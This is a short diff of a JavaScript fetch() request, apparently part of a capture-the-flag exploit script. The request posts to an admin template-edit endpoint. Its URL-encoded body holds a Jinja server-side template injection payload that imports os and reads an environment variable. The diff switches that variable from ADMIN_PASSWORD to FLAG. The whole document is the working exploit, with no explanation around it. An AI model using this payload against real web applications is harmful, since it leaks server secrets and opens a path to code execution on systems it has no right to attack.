@@ -16,7 +16,7 @@ let x = fetch("/admin/templates/1/edit", {
     "sec-gpc": "1",
     "upgrade-insecure-requests": "1"
   },
-  "body": "name=Default+Ticket+Template&html_content=%3Ch1%3E%7B%7B+request.application.__globals__.__builtins__.__import__%28%27os%27%29.environ.get%28%27ADMIN_PASSWORD%27%29+%7D%7D%3C%2Fh1%3E&is_default=on",
+  "body": "name=Default+Ticket+Template&html_content=%3Ch1%3E%7B%7B+request.application.__globals__.__builtins__.__import__%28%27os%27%29.environ.get%28%27FLAG%27%29+%7D%7D%3C%2Fh1%3E&is_default=on",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
